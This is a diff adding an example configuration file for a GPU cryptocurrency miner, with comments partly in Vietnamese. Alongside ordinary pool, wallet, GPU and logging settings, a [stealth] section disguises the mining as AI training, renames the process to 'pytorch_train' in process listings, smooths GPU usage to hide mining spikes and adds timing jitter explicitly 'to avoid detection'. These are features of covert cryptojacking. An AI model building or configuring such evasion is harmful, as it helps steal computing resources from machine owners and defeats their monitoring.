@@ -1,0 +1,78 @@
+# OPUS GPU Mining System - Example Configuration (Cấu hình mẫu)
+# Copy this file và customize for your setup
+
+[mining]
+# Pool URL - replace với actual mining pool
+# Examples:
+#   Ethash: stratum+tcp://us-eth.ethermine.org:4444
+#   KawPow: stratum+tcp://kawpow.usa-west.nicehash.com:3385
+pool_url = "stratum+tcp://pool.example.com:3333"
+
+# Your wallet address - replace với actual wallet
+wallet_address = "0x0000000000000000000000000000000000000000"
+
+# Mining algorithm
+# Options: "Ethash", "KawPow", "RandomX"
+algorithm = "Ethash"
+
+# GPU devices to use (check with nvidia-smi)
+# Example: [0, 1, 2] for 3 GPUs
+gpu_devices = [0]
+
+# Mining intensity (0.0 = minimum, 1.0 = maximum GPU usage)
+# Recommended: 0.8-1.0 for optimal hashrate
+intensity = 0.8
+
+# Worker name displayed on pool
+worker_name = "opus-gpu-miner"
+
+[stealth]
+# Stealth profile - disguised as legitimate workload
+# Options: "AiTraining", "ImageProcessing", "ScientificComputing", "AiInference"
+profile = "AiTraining"
+
+# Process name shown in ps/top/htop
+process_name = "pytorch_train"
+
+# GPU usage smoothing (reduce mining pattern spikes)
+enable_resource_smoothing = true
+
+# Add random timing delays to avoid detection
+enable_timing_jitter = true
+
+[coordination]
+# Run mode: "Standalone" hoặc "Distributed"
+mode = "Standalone"
+
+# For distributed mode: peer addresses of other nodes
+peers = []
+
+# Health check interval (seconds)
+health_check_interval = 30
+
+# Metrics collection interval (seconds)
+metrics_interval = 60
+
+[security]
+# Syscall filtering for attack surface reduction
+enable_seccomp = true
+
+# Process namespace isolation
+enable_namespaces = true
+
+# Encrypt wallet private keys
+enable_wallet_encryption = true
+
+# Security profile
+# Options: "Development", "Standard", "Production"
+profile = "Production"
+
+[logging]
+# Log level: "trace", "debug", "info", "warn", "error"
+level = "info"
+
+# Enable JSON formatted logs
+json_format = false
+
+# Optional: custom log file path
+# file_path = "/var/log/opus-mining/app.log"
